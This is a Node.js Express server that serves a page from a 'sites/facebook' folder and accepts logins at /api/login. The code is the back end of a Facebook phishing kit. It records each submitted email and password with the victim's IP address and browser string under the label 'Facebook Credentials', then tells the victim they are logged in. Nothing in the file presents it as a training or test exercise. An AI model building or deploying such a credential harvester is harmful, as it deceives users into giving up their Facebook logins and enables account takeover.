
const express = require("express");
const path = require("path");
const cors = require("cors");
const os = require("os");

const app = express();
const PORT = process.env.PORT || 3000;
app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.disable("x-powered-by");

// normalize IPv6-mapped IPv4 address -> strip ::ffff:
function normalizeIp(raw) {
  if (!raw) return "unknown";
  return String(raw).replace(/^::ffff:/i, "");
}

async function saveIpOnce(ip, userAgent) {
  try {
    const normalized = normalizeIp(ip);
    const ipLine = `IP: ${normalized}`;
    const block = `IP: ${normalized}${os.EOL} User-Agent: ${userAgent || "unknown"}${os.EOL}${os.EOL}`;
    console.log(block);
  } catch (err) {
    console.error("Error saving IP:", err);
  }
}

// Middleware to capture client IP and save it once (async, non-blocking)
app.use((req, res, next) => {
  const forwarded = req.headers["x-forwarded-for"];
  const rawIp = (forwarded && forwarded.split(",").shift().trim()) || req.socket.remoteAddress || req.ip || "unknown";
  const clientIp = normalizeIp(rawIp);
  const userAgent = req.headers["user-agent"] || "unknown";

  req.clientIp = clientIp;
  req.clientUA = userAgent;

  next();
});

// Serve frontend
app.use(express.static(path.join(__dirname, "sites/facebook")));

app.post("/api/login", async (req, res) => {
  const { email, password } = req.body || {};
  const ip = req.clientIp || "unknown";
  const ua = req.clientUA || "unknown";


  if (!email || !password) {
    return res.status(400).json({ success: false, message: "Missing fields" });
  }

  try {
    console.log("Facebook Credentials:",{email,password,ip});
    saveIpOnce(ip, ua).catch(() => {});
    return res.json({ success: true, message: "Logged in" });
  } catch (err) {
    console.error("Error saving username:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

// Catch-all for SPA
app.get(/.*/, (req, res) => {
  res.sendFile(path.join(__dirname, "sites/facebook", "index.html"));
});

app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
